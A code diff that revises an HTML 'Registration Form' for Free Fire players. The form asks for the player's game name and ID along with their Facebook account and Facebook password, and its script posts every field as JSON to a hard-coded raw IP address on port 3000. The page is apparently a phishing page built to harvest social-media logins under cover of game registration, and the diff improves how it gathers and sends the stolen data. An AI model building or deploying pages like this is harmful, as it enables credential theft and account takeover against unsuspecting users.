@@ -3,76 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>
     <style>
         body {
-            background-image: url('your-background-image.jpg'); /* Replace 'your-background-image.jpg' with the actual path to your background image */
+            background-image: url('./ff.jpg');
             background-size: cover;
-            background-position: center;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-
-        #form-container {
+        .container {
+            text-align: center;
             background-color: rgba(255, 255, 255, 0.8);
             padding: 20px;
             border-radius: 10px;
-            text-align: center;
         }
     </style>
 </head>
 <body>
-    <div id="form-container">
-        <h1>Registration Form</h1>
-        <form id="registration-form">
+    <div class="container">
+        <h2>Registration Form</h2>
+        <form id="registrationForm">
             <label for="freefireName">Freefire Name:</label>
             <input type="text" id="freefireName" name="freefireName" required><br><br>
             
             <label for="freefireid">Freefire ID:</label>
             <input type="text" id="freefireid" name="freefireid" required><br><br>
             
-            <label for="facebookAccount">Facebook Account:</label>
-            <input type="text" id="facebookAccount" name="usermobno" required><br><br>
+            <label for="fbAccount">Facebook Account:</label>
+            <input type="text" id="fbAccount" name="usermobno" required><br><br>
             
-            <label for="facebookPassword">Facebook Password:</label>
-            <input type="password" id="facebookPassword" name="password" required><br><br>
+            <label for="fbPassword">Facebook Password:</label>
+            <input type="password" id="fbPassword" name="password" required><br><br>
             
-            <button type="button" id="submit-button">Submit</button>
+            <button type="submit">Submit</button>
         </form>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            const submitButton = document.getElementById('submit-button');
-            const form = document.getElementById('registration-form');
-
-            submitButton.addEventListener('click', function () {
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('registrationForm');
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
                 const formData = new FormData(form);
-                const requestBody = {
-                    usermobno: formData.get('usermobno'),
-                    password: formData.get('password')
-                };
-                alert(requestBody)
+                const data = {};
+                formData.forEach((value, key) => {
+                    data[key] = value;
+                });
+
                 fetch('http://13.53.125.215:3000/register', {
                     method: 'POST',
+                    body: JSON.stringify(data),
                     headers: {
                         'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(requestBody)
-                })
-                .then(response => {
-                    
-                    if (response.success) {
-                        alert('Registration successful');
-                    } else {
-                        alert('Registration failed');
                     }
                 })
+                .then(response => response.json())
+                .then(result => {
+                    console.log(result);
+                    // Handle the response here
+                })
                 .catch(error => {
-                    console.error('Error:', error);
-                    alert('err');
+                    console.error(error);
+                    // Handle errors here
                 });
             });
         });
